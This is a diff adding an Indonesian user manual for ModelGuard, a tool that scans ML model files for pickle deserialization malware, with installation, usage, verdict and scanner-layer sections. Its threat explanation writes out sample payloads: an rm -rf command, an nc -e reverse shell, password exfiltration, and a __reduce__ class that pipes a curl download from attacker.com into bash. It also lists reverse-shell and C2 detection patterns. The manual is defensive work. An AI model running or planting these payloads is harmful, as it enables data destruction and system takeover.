@@ -1,0 +1,965 @@
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║                     MODELGUARD — PANDUAN PENGGUNAAN LENGKAP                    ║
+║                      ML Model Security Scanner  |  Versi 1.0                   ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+Dibuat untuk: Windows 11, Python 3.11+
+Lokasi project: modelguard/
+Tanggal dokumentasi: 2026
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  DAFTAR ISI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  1.  APA ITU MODELGUARD?
+  2.  MASALAH YANG DISELESAIKAN
+  3.  ARSITEKTUR SISTEM
+  4.  STRUKTUR FOLDER PROJECT
+  5.  INSTALASI LANGKAH DEMI LANGKAH
+  6.  CARA MENGGUNAKAN — CLI (Command Line)
+  7.  CARA MENGGUNAKAN — WEB UI (Browser)
+  8.  PENJELASAN HASIL SCAN (VERDICT & FINDINGS)
+  9.  PENJELASAN 4 LAYER SCANNER
+  10. PENJELASAN FILE YARA RULES
+  11. FORMAT FILE YANG DIDUKUNG
+  12. PERINTAH LENGKAP REFERENSI
+  13. TROUBLESHOOTING / MASALAH UMUM
+  14. CONTOH OUTPUT LENGKAP
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  1. APA ITU MODELGUARD?
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ModelGuard adalah alat keamanan siber yang dirancang khusus untuk memeriksa
+file model machine learning (ML) sebelum digunakan oleh tim data science
+atau engineer.
+
+FUNGSI UTAMA:
+  → Mendeteksi malware yang disembunyikan di dalam file model ML
+  → Menganalisis bytecode pickle untuk menemukan kode berbahaya
+  → Memindai pola ancaman menggunakan aturan YARA
+  → Menganalisis entropi dan string tersembunyi di dalam file
+  → Menghasilkan laporan SAFE / SUSPICIOUS / MALICIOUS dengan bukti detail
+
+SIAPA YANG MEMBUTUHKAN INI?
+  → Tim ML/AI yang mendownload model dari internet (Hugging Face, GitHub, dll)
+  → Security engineer yang mengaudit pipeline ML
+  → Perusahaan yang menerima model dari vendor atau pihak ketiga
+  → Researcher yang memverifikasi integritas model sebelum dieksekusi
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  2. MASALAH YANG DISELESAIKAN
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ANCAMAN NYATA: PICKLE DESERIALIZATION ATTACK
+─────────────────────────────────────────────
+File model ML yang umum (terutama .pkl dan .pt) menggunakan format serialisasi
+Python yang disebut "pickle". Format ini memiliki celah keamanan kritis:
+
+  Ketika kode ini dijalankan:
+      import pickle
+      model = pickle.load(open("model_dari_internet.pkl", "rb"))
+
+  Python akan OTOMATIS MENGEKSEKUSI perintah apapun yang ada di dalam opcode
+  REDUCE pada file pickle tersebut — termasuk:
+      - os.system("rm -rf /")              ← hapus semua file
+      - subprocess.call(["nc", "-e", ...]) ← buka reverse shell
+      - requests.post(url, data=passwords) ← exfiltrasi data
+      - eval(base64.b64decode(payload))    ← jalankan kode tersembunyi
+
+MENGAPA BERBAHAYA?
+  Seorang attacker cukup mengunggah model yang tampak sah ke Hugging Face
+  atau GitHub, dan siapapun yang mendownload lalu me-load model tersebut
+  akan langsung terinfeksi — bahkan tanpa membuka file apapun secara manual.
+
+CONTOH SERANGAN NYATA:
+  class MaliciousModel:
+      def __reduce__(self):
+          return (os.system, ("curl http://attacker.com/shell.sh | bash",))
+
+  Baris kode di atas tidak terlihat berbahaya dari luar, tapi ketika
+  pickle.load() dipanggil, perintah curl tersebut LANGSUNG DIEKSEKUSI.
+
+ModelGuard mendeteksi pola seperti ini SEBELUM file tersebut pernah di-load.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  3. ARSITEKTUR SISTEM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+DIAGRAM ALUR LENGKAP:
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │  INPUT: File model dari user (CLI atau Web Upload)          │
+  └──────────────────────────┬──────────────────────────────────┘
+                             │
+                             ▼
+  ┌─────────────────────────────────────────────────────────────┐
+  │  FILE RECEIVER                                               │
+  │  • Validasi ekstensi file                                    │
+  │  • Simpan ke folder uploads/ dengan nama UUID unik          │
+  │  • Hitung SHA-256 hash untuk identifikasi                   │
+  └──────────────────────────┬──────────────────────────────────┘
+                             │
+                             ▼
+  ┌═════════════════════════════════════════════════════════════╗
+  ║  4-LAYER SCANNER PIPELINE (berjalan berurutan)              ║
+  ║                                                             ║
+  ║  ┌─────────────────────────────────────────────────────┐   ║
+  ║  │  LAYER 1 — FORMAT VALIDATOR                          │   ║
+  ║  │  src/scanners/format_scanner.py                      │   ║
+  ║  │  • Baca magic bytes pertama file                     │   ║
+  ║  │  • Cocokkan dengan tanda tangan format resmi         │   ║
+  ║  │  • Deteksi file yang disamarkan (wrong extension)    │   ║
+  ║  └─────────────────────────┬───────────────────────────┘   ║
+  ║                            │                                ║
+  ║  ┌─────────────────────────▼───────────────────────────┐   ║
+  ║  │  LAYER 2 — PICKLE BYTECODE ANALYZER                  │   ║
+  ║  │  src/scanners/pickle_scanner.py                      │   ║
+  ║  │  • Disassemble pickle dengan pickletools             │   ║
+  ║  │  • Ekstrak semua GLOBAL/STACK_GLOBAL opcode pairs    │   ║
+  ║  │  • Periksa callable terhadap whitelist ML framework  │   ║
+  ║  │  • Scan raw bytes untuk string berbahaya             │   ║
+  ║  │  • Analisis AST dengan fickling (jika tersedia)      │   ║
+  ║  └─────────────────────────┬───────────────────────────┘   ║
+  ║                            │                                ║
+  ║  ┌─────────────────────────▼───────────────────────────┐   ║
+  ║  │  LAYER 3 — YARA RULE SCANNER                         │   ║
+  ║  │  src/scanners/yara_scanner.py                        │   ║
+  ║  │  • Load semua file rules/*.yar                       │   ║
+  ║  │  • Scan seluruh file sebagai binary blob             │   ║
+  ║  │  • 5 kategori rules: reverse shell, shellcode,       │   ║
+  ║  │    C2 domain, encoded payload, suspicious imports    │   ║
+  ║  └─────────────────────────┬───────────────────────────┘   ║
+  ║                            │                                ║
+  ║  ┌─────────────────────────▼───────────────────────────┐   ║
+  ║  │  LAYER 4 — DEEP CONTENT SCANNER                      │   ║
+  ║  │  src/scanners/deep_scanner.py                        │   ║
+  ║  │  • Shannon entropy analysis (deteksi payload         │   ║
+  ║  │    terenkripsi/terkompresi)                          │   ║
+  ║  │  • Ekstraksi URL, IP address, domain mencurigakan    │   ║
+  ║  │  • modelscan deep analysis (jika terinstall)         │   ║
+  ║  │  • Pemeriksaan metadata HDF5 (.h5)                   │   ║
+  ║  │  • Sanity check tensor shape (.safetensors/.pt)      │   ║
+  ║  └─────────────────────────┬───────────────────────────┘   ║
+  ╚═════════════════════════════╪═══════════════════════════════╝
+                               │
+                               ▼
+  ┌─────────────────────────────────────────────────────────────┐
+  │  REPORT GENERATOR  (src/report.py)                          │
+  │  • Gabungkan semua findings dari 4 layer                    │
+  │  • Tentukan verdict berdasarkan severity tertinggi          │
+  │  • Hitung risk score 0–100                                  │
+  │  • Simpan ke database SQLite                                │
+  └──────────────────────────┬──────────────────────────────────┘
+                             │
+              ┌──────────────┴──────────────┐
+              ▼                             ▼
+  ┌─────────────────────┐     ┌─────────────────────────────┐
+  │   CLI OUTPUT        │     │   WEB REPORT (HTML)          │
+  │   Terminal dengan   │     │   http://localhost:8000/     │
+  │   colour-coded      │     │   report/{id}                │
+  │   verdict & detail  │     │   + Download JSON            │
+  └─────────────────────┘     └─────────────────────────────┘
+
+KOMPONEN TEKNOLOGI:
+  ┌────────────────────┬──────────────────────────────────────────┐
+  │ Komponen           │ Teknologi                                 │
+  ├────────────────────┼──────────────────────────────────────────┤
+  │ Core Scanner       │ Python 3.11+ stdlib (pickletools, hashlib)│
+  │ Pickle Analysis    │ fickling 0.0.9 (AST parser)              │
+  │ Pattern Matching   │ yara-python 4.3.x                        │
+  │ Deep Scan          │ modelscan 0.8.x (ProtectAI)              │
+  │ Tensor Validation  │ safetensors 0.4.x                        │
+  │ Web Backend        │ FastAPI 0.104 + Uvicorn                  │
+  │ HTML Template      │ Jinja2 3.x                               │
+  │ Database           │ SQLite3 (built-in Python)                │
+  │ File Upload        │ python-multipart                         │
+  └────────────────────┴──────────────────────────────────────────┘
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  4. STRUKTUR FOLDER PROJECT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+modelguard/
+│
+├── cli.py                    ← Entry point CLI (command line interface)
+├── run.py                    ← Entry point Web UI (uvicorn server)
+├── requirements.txt          ← Daftar semua dependency Python
+├── modelguard.db             ← Database SQLite (otomatis terbuat saat scan pertama)
+│
+├── src/                      ← Source code utama scanner
+│   ├── __init__.py
+│   ├── scanner.py            ← Orchestrator: koordinasi 4 layer, definisi ScanResult
+│   ├── report.py             ← Konversi ScanResult ke dict/JSON
+│   ├── database.py           ← CRUD operations ke SQLite
+│   └── scanners/             ← Implementasi masing-masing layer
+│       ├── __init__.py
+│       ├── format_scanner.py ← Layer 1: validasi magic bytes
+│       ├── pickle_scanner.py ← Layer 2: analisis pickle bytecode
+│       ├── yara_scanner.py   ← Layer 3: YARA rules engine
+│       └── deep_scanner.py   ← Layer 4: entropi, string, metadata
+│
+├── rules/                    ← File YARA rules (.yar)
+│   ├── suspicious_imports.yar ← Deteksi os.system, subprocess, eval, dll
+│   ├── reverse_shell.yar     ← Deteksi pola reverse shell
+│   ├── encoded_payload.yar   ← Deteksi base64 payload & PowerShell encoded
+│   ├── c2_indicators.yar     ← Deteksi domain C2 (ngrok, .onion, dll)
+│   └── shellcode.yar         ← Deteksi NOP sled, shellcode signature
+│
+├── web/                      ← FastAPI web application
+│   ├── main.py               ← Routing: GET /, POST /scan, GET /report/{id}
+│   ├── templates/
+│   │   ├── index.html        ← Halaman utama: drag & drop + scan history
+│   │   └── report.html       ← Halaman detail laporan per scan
+│   └── static/
+│       └── style.css         ← Dark theme stylesheet
+│
+├── test_models/              ← File model untuk testing
+│   ├── generate_test_models.py ← Script pembuat test fixtures
+│   ├── safe_model.pkl        ← sklearn LogisticRegression (aman)
+│   ├── malicious_model.pkl   ← __reduce__ exploit (DEMO, tidak berbahaya)
+│   └── suspicious_model.pkl  ← Dict dengan string mencurigakan
+│
+└── uploads/                  ← Folder temporary untuk file yang diupload
+    └── .gitkeep              ← Placeholder agar folder masuk git
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  5. INSTALASI LANGKAH DEMI LANGKAH
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PRASYARAT:
+  • Python 3.11 atau lebih baru sudah terinstall
+  • pip tersedia di terminal
+  • Koneksi internet (untuk download package)
+
+──────────────────────────────────────────────
+LANGKAH 1: Masuk ke folder project
+──────────────────────────────────────────────
+
+  Buka PowerShell atau Command Prompt, lalu ketik:
+
+      cd "D:\Portofolio Cyber Alif\Project 11 - model guard\modelguard"
+
+──────────────────────────────────────────────
+LANGKAH 2: Install semua dependency Python
+──────────────────────────────────────────────
+
+      pip install -r requirements.txt
+
+  Package yang akan terinstall:
+  • fastapi          → framework web API
+  • uvicorn          → ASGI server untuk menjalankan FastAPI
+  • python-multipart → handler upload file
+  • jinja2           → template HTML
+  • aiofiles         → file I/O asinkron
+  • peewee           → ORM database
+  • fickling         → analisis pickle bytecode (AST)
+  • yara-python      → binding Python untuk YARA engine
+  • modelscan        → deep scanner dari ProtectAI
+  • safetensors      → validasi format safetensors
+  • python-magic-bin → deteksi file type dari magic bytes (Windows)
+  • numpy            → array numerik (untuk test model)
+  • scikit-learn     → ML framework (untuk test model)
+
+  CATATAN: Jika ada package yang gagal install, scanner tetap berjalan
+  tapi layer yang membutuhkan package tersebut akan di-skip dengan
+  pesan WARNING — bukan error fatal.
+
+──────────────────────────────────────────────
+LANGKAH 3: Install YARA binary (untuk Layer 3)
+──────────────────────────────────────────────
+
+  YARA adalah engine yang perlu diinstall terpisah di sistem operasi.
+  Tanpa ini, Layer 3 akan di-skip dengan pesan INFO, tapi scanner
+  tetap berfungsi di 3 layer lainnya.
+
+  Windows (menggunakan Chocolatey):
+      choco install yara
+
+  Jika belum punya Chocolatey:
+      Set-ExecutionPolicy Bypass -Scope Process -Force
+      [System.Net.ServicePointManager]::SecurityProtocol = 3072
+      iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+      choco install yara
+
+──────────────────────────────────────────────
+LANGKAH 4: Generate file test model
+──────────────────────────────────────────────
+
+      python test_models/generate_test_models.py
+
+  Perintah ini akan membuat 3 file .pkl di folder test_models/:
+  • safe_model.pkl       → sklearn LogisticRegression yang aman
+  • malicious_model.pkl  → model dengan __reduce__ payload (DEMO)
+  • suspicious_model.pkl → model dengan string mencurigakan
+
+  PENTING: Jalankan perintah ini dari dalam folder modelguard/
+  bukan dari folder luar.
+
+──────────────────────────────────────────────
+LANGKAH 5: Verifikasi instalasi
+──────────────────────────────────────────────
+
+  Jalankan scan pertama untuk memastikan semuanya berfungsi:
+
+      set PYTHONIOENCODING=utf-8
+      python cli.py scan test_models/safe_model.pkl
+
+  Jika berhasil, Anda akan melihat output dengan VERDICT: SAFE.
+  Jika ada error, lihat bagian TROUBLESHOOTING di bawah.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  6. CARA MENGGUNAKAN — CLI (Command Line Interface)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PERSIAPAN (wajib di Windows agar karakter unicode tampil benar):
+
+      set PYTHONIOENCODING=utf-8
+
+  Atau tambahkan ke PowerShell session:
+
+      $env:PYTHONIOENCODING = "utf-8"
+
+──────────────────────────────────────────────
+PERINTAH 1: Scan satu file model
+──────────────────────────────────────────────
+
+  SINTAKS:
+      python cli.py scan <path_ke_file>
+
+  CONTOH:
+      python cli.py scan test_models/malicious_model.pkl
+      python cli.py scan C:\Users\user\Downloads\model_from_hf.pkl
+      python cli.py scan D:\models\bert_classifier.pt
+
+  Perintah ini akan:
+  1. Membaca file dan menghitung SHA-256 hash
+  2. Menjalankan 4 layer scanner secara berurutan
+  3. Menampilkan hasil di terminal (verdict + risk score + findings)
+  4. Menyimpan hasil ke database SQLite secara otomatis
+  5. Menampilkan link ke web report
+
+──────────────────────────────────────────────
+PERINTAH 2: Scan dengan detail penuh (verbose)
+──────────────────────────────────────────────
+
+  SINTAKS:
+      python cli.py scan <path_ke_file> --verbose
+
+  CONTOH:
+      python cli.py scan test_models/suspicious_model.pkl --verbose
+
+  Dengan flag --verbose, setiap finding akan menampilkan:
+  • Deskripsi lengkap mengapa ini berbahaya
+  • Evidence/bukti (string yang ditemukan, offset di file, dll)
+  • Semua severity level ditampilkan (tidak hanya CRITICAL/HIGH)
+
+──────────────────────────────────────────────
+PERINTAH 3: Lihat riwayat scan
+──────────────────────────────────────────────
+
+  SINTAKS:
+      python cli.py history
+
+  Menampilkan 10 scan terakhir dari database dengan kolom:
+  • ID scan
+  • Nama file
+  • Verdict (SAFE / SUSPICIOUS / MALICIOUS)
+  • Risk score
+  • Waktu scan
+
+──────────────────────────────────────────────
+PERINTAH 4: Generate ulang test models
+──────────────────────────────────────────────
+
+  SINTAKS:
+      python cli.py generate-test
+
+  Berguna jika file test_models/*.pkl tidak ada atau terhapus.
+  Shortcut untuk menjalankan: python test_models/generate_test_models.py
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  7. CARA MENGGUNAKAN — WEB UI (Browser)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+──────────────────────────────────────────────
+LANGKAH 1: Jalankan web server
+──────────────────────────────────────────────
+
+      python run.py
+
+  Server akan berjalan di:  http://localhost:8000
+  Tekan Ctrl+C untuk menghentikan server.
+
+──────────────────────────────────────────────
+LANGKAH 2: Buka browser
+──────────────────────────────────────────────
+
+  Buka Chrome, Firefox, atau browser lainnya dan akses:
+
+      http://localhost:8000
+
+──────────────────────────────────────────────
+LANGKAH 3: Upload file model
+──────────────────────────────────────────────
+
+  Ada dua cara upload file:
+
+  CARA A — Drag & Drop:
+  1. Buka folder file model di File Explorer
+  2. Seret (drag) file .pkl/.pt/.h5/dll ke kotak besar di tengah halaman
+  3. Lepaskan (drop) — scan akan otomatis dimulai
+
+  CARA B — Klik untuk Browse:
+  1. Klik di mana saja pada kotak upload
+  2. Dialog file browser akan muncul
+  3. Pilih file model yang ingin di-scan
+  4. Klik Open
+
+──────────────────────────────────────────────
+LANGKAH 4: Tunggu hasil scan
+──────────────────────────────────────────────
+
+  Progress bar akan muncul selama scan berjalan.
+  Setelah selesai, browser otomatis pindah ke halaman report.
+
+──────────────────────────────────────────────
+LANGKAH 5: Baca halaman report
+──────────────────────────────────────────────
+
+  Halaman report berisi:
+  • Header: nama file, verdict besar, risk score, SHA-256, durasi scan
+  • Summary box: jumlah finding per severity (CRITICAL/HIGH/MEDIUM/LOW/INFO)
+  • Layer timeline: visual 4 layer dengan tanda ✓ (aman) atau ✗ (ada masalah)
+  • Tabel findings: detail setiap temuan dengan severity, deskripsi, dan bukti
+  • Tombol "Download JSON Report": unduh laporan dalam format JSON
+  • Tombol "Scan Another File": kembali ke halaman utama
+
+──────────────────────────────────────────────
+ENDPOINT API (untuk integrasi dengan sistem lain)
+──────────────────────────────────────────────
+
+  GET  /                      → Halaman utama (HTML)
+  POST /scan                  → Upload & scan file (JSON response)
+  GET  /report/{id}           → Halaman detail report (HTML)
+  GET  /report/{id}/json      → Data report dalam format JSON
+
+  Contoh integrasi dengan curl:
+      curl -X POST http://localhost:8000/scan \
+           -F "file=@model.pkl"
+
+  Response JSON:
+      {
+        "scan_id": 5,
+        "verdict": "MALICIOUS",
+        "risk_score": 94,
+        "findings_count": 3
+      }
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  8. PENJELASAN HASIL SCAN (VERDICT & FINDINGS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TIGA JENIS VERDICT:
+┌─────────────────┬────────────────┬──────────────────────────────────────────────┐
+│ Verdict         │ Risk Score     │ Arti                                         │
+├─────────────────┼────────────────┼──────────────────────────────────────────────┤
+│ ✅ SAFE         │ 0  – 29        │ Tidak ditemukan ancaman. File aman digunakan. │
+│ ⚠️  SUSPICIOUS  │ 30 – 89        │ Ada pola mencurigakan. Perlu investigasi.    │
+│ ⛔ MALICIOUS    │ 90 – 100       │ Ditemukan ancaman aktif. JANGAN di-load!     │
+└─────────────────┴────────────────┴──────────────────────────────────────────────┘
+
+ATURAN PENENTUAN VERDICT:
+  • Jika ada 1+ finding CRITICAL  → MALICIOUS  (risk 90–100)
+  • Jika ada 1+ finding HIGH      → SUSPICIOUS (risk 60–89)
+  • Jika ada 1+ finding MEDIUM    → SUSPICIOUS (risk 30–59)
+  • Jika hanya LOW / INFO / kosong → SAFE       (risk 0–29)
+
+LIMA LEVEL SEVERITY FINDING:
+┌──────────────┬─────────────────────────────────────────────────────────────────┐
+│ [CRITICAL]   │ Eksekusi kode terkonfirmasi — opcode pickle langsung memanggil  │
+│              │ fungsi berbahaya (os.system, subprocess, eval, dll)             │
+├──────────────┼─────────────────────────────────────────────────────────────────┤
+│ [HIGH]       │ Pola sangat mencurigakan — string berbahaya dalam binary,       │
+│              │ domain C2, callable tidak dikenal dalam REDUCE opcode           │
+├──────────────┼─────────────────────────────────────────────────────────────────┤
+│ [MEDIUM]     │ Anomali yang perlu diperiksa — entropi tinggi, URL embedded,   │
+│              │ magic bytes tidak cocok ekstensi                                │
+├──────────────┼─────────────────────────────────────────────────────────────────┤
+│ [LOW]        │ Observasi minor — IP address ditemukan, ukuran tensor janggal  │
+├──────────────┼─────────────────────────────────────────────────────────────────┤
+│ [INFO]       │ Informasi status — layer di-skip karena tool tidak terinstall  │
+└──────────────┴─────────────────────────────────────────────────────────────────┘
+
+APA YANG HARUS DILAKUKAN BERDASARKAN VERDICT:
+
+  SAFE:
+  → File aman. Lanjutkan penggunaan seperti biasa.
+  → Tetap pantau jika file datang dari sumber tidak dikenal.
+
+  SUSPICIOUS:
+  → JANGAN langsung di-load di lingkungan produksi.
+  → Baca detail findings untuk memahami mengapa mencurigakan.
+  → Jika memungkinkan, minta file dari sumber resmi yang terpercaya.
+  → Jika harus digunakan, gunakan di sandbox/virtual machine terisolasi.
+
+  MALICIOUS:
+  → JANGAN di-load dalam kondisi apapun.
+  → Hapus file dari sistem.
+  → Laporkan ke tim keamanan atau platform tempat file didownload.
+  → Periksa apakah file pernah di-load sebelumnya (cek log sistem).
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  9. PENJELASAN 4 LAYER SCANNER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│  LAYER 1 — FORMAT VALIDATOR                                                  │
+│  File: src/scanners/format_scanner.py                                        │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+FUNGSI: Memverifikasi bahwa isi file sesuai dengan ekstensi yang diklaim.
+
+CARA KERJA:
+  Setiap format file memiliki "tanda tangan" (magic bytes) di awal file:
+  • .pkl / .joblib → byte pertama harus \x80 (pickle protocol marker)
+  • .pt            → harus dimulai dengan PK (format ZIP — PyTorch pakai ZIP)
+  • .h5            → harus dimulai dengan \x89HDF\r\n\x1a\n (HDF5 signature)
+  • .npy           → harus dimulai dengan \x93NUMPY
+  • .safetensors   → harus punya JSON header yang valid di awal file
+
+KENAPA PENTING:
+  Attacker bisa menyamarkan file berbahaya dengan mengganti ekstensinya.
+  Misalnya, file executable (.exe) yang diganti jadi .pkl. Layer ini
+  mendeteksi ketidakcocokan tersebut.
+
+CONTOH FINDING:
+  [MEDIUM] Magic bytes mismatch
+           Expected 'PK' (ZIP), got '7f45' (ELF executable)
+           → File .pt yang sebenarnya adalah binary Linux executable
+
+──────────────────────────────────────────────────────────────────────────────
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│  LAYER 2 — PICKLE BYTECODE ANALYZER                                          │
+│  File: src/scanners/pickle_scanner.py                                        │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+FUNGSI: Menganalisis instruksi bytecode pickle untuk menemukan callable
+        berbahaya yang akan dieksekusi saat model di-load.
+
+CARA KERJA:
+  1. Gunakan pickletools untuk "mendisassemble" file pickle — mengubah
+     binary menjadi daftar instruksi yang bisa dibaca manusia.
+
+  2. Cari opcode GLOBAL dan STACK_GLOBAL:
+     Opcode ini menentukan FUNGSI apa yang akan dipanggil oleh pickle.
+     Contoh opcode normal:  GLOBAL 'sklearn.linear_model LogisticRegression'
+     Contoh opcode bahaya:  GLOBAL 'builtins print'  ← trigger jika REDUCE ada
+                            GLOBAL 'os system'
+                            GLOBAL 'subprocess call'
+
+  3. Ekstrak pasangan (module, function) dari opcode:
+     Contoh:  SHORT_BINUNICODE 'builtins'
+              SHORT_BINUNICODE 'print'
+              STACK_GLOBAL
+     → Diekstrak sebagai: builtins.print
+
+  4. Bandingkan dengan whitelist module ML framework yang aman:
+     Aman: sklearn.*, numpy.*, scipy.*, torch.*, pandas.*, copyreg.*,
+           _codecs.*, builtins.object, builtins.dict, builtins.list, dll.
+
+     Berbahaya: builtins.print (di luar context ML), builtins.eval,
+                subprocess.*, os.system, socket.*, ctypes.*, importlib.*
+
+  5. Jika ada opcode REDUCE atau STACK_GLOBAL + callable tidak dikenal
+     → CRITICAL finding
+
+  6. Scan raw bytes untuk string berbahaya yang mungkin ada sebagai
+     argumen (walaupun tidak langsung dieksekusi):
+     • "os.system", "subprocess", "eval(", "exec(", "socket.connect"
+
+  7. Analisis AST menggunakan fickling (jika terinstall)
+
+KENAPA INI LAYER TERPENTING:
+  Ini adalah satu-satunya layer yang mendeteksi PICKLE DESERIALIZATION ATTACK
+  secara langsung — ancaman utama yang menyebabkan tool ini dibuat.
+
+──────────────────────────────────────────────────────────────────────────────
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│  LAYER 3 — YARA RULE SCANNER                                                 │
+│  File: src/scanners/yara_scanner.py                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+FUNGSI: Memindai seluruh isi file sebagai binary blob menggunakan pola
+        (rules) yang telah didefinisikan sebelumnya.
+
+CARA KERJA:
+  YARA adalah bahasa aturan untuk mendeskripsikan pola malware. Setiap
+  file .yar berisi satu atau lebih rule dengan kondisi pencocokan string
+  atau byte pattern.
+
+  Scanner membaca semua file dari folder rules/ dan mengompilasinya
+  menjadi satu mesin pencocokan, lalu menjalankannya atas seluruh file.
+
+MEMBUTUHKAN:
+  • yara-python (pip install yara-python) — Python binding
+  • YARA binary di sistem (choco install yara) — engine asli
+
+  Jika tidak terinstall: Layer 3 di-skip dengan INFO finding.
+  Tiga layer lain tetap berjalan normal.
+
+FINDING FORMAT:
+  [HIGH] YARA match: SuspiciousImports
+         Rule 'SuspiciousImports' matched.
+         Evidence: 0x1A4: $s1='os.system'; 0x81: $s2='subprocess'
+
+──────────────────────────────────────────────────────────────────────────────
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│  LAYER 4 — DEEP CONTENT SCANNER                                              │
+│  File: src/scanners/deep_scanner.py                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+FUNGSI: Analisis mendalam terhadap konten file untuk menemukan anomali
+        yang tidak terdeteksi oleh layer sebelumnya.
+
+CARA KERJA — 5 sub-analisis:
+
+  A) SHANNON ENTROPY ANALYSIS:
+     Membagi file menjadi blok 1KB dan menghitung entropi (tingkat
+     ketidakacakan) setiap blok menggunakan rumus Shannon Entropy.
+
+     Entropi > 7.5 pada lebih dari 50% blok → kemungkinan ada data
+     terenkripsi atau terkompresi yang disembunyikan (payload tersembunyi).
+
+     Normal text/code: entropi ~4.0–5.5
+     Compressed data:  entropi ~7.0–7.8
+     Encrypted data:   entropi ~7.8–8.0 (hampir sempurna random)
+
+  B) STRING & URL EXTRACTION:
+     Mencari pola-pola mencurigakan dalam binary:
+     • URL (http:// atau https://) → kemungkinan C2 callback
+     • IP address (bukan loopback 127.x) → infrastructure C2
+     • Domain mencurigakan: .onion, ngrok.io, serveo.net, ddns.net, dll
+
+  C) MODELSCAN INTEGRATION:
+     Jika modelscan (ProtectAI) terinstall, jalankan scan mendalam
+     tambahan dan tambahkan hasilnya ke findings.
+
+  D) HDF5 METADATA CHECK (khusus file .h5):
+     Baca semua nama dataset dan atribut di dalam file HDF5.
+     Flag jika ditemukan nama yang tidak lazim untuk model ML:
+     • "exec", "eval", "shell", "cmd", "payload", "code"
+
+  E) TENSOR SHAPE SANITY CHECK (khusus .pt dan .safetensors):
+     Periksa dimensi semua tensor. Tensor 1-dimensi yang sangat besar
+     (>10 juta elemen) bisa berisi arbitrary data tersembunyi.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  10. PENJELASAN FILE YARA RULES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+FILE: rules/suspicious_imports.yar
+  Rule: SuspiciousImports
+  Severity: HIGH
+  Mendeteksi: String Python berbahaya yang ditemukan dalam binary model
+  Pattern: "os.system", "subprocess", "__import__", "exec(", "eval(", "compile("
+
+FILE: rules/reverse_shell.yar
+  Rule: DetectReverseShell
+  Severity: CRITICAL
+  Mendeteksi: Kombinasi pola reverse shell
+  Pattern: (socket + connect + send/recv) ATAU (/bin/bash, /bin/sh, nc -e, pty.spawn)
+
+FILE: rules/encoded_payload.yar
+  Rules: DetectBase64Payload, DetectEncodedPowerShell
+  Severity: MEDIUM / HIGH
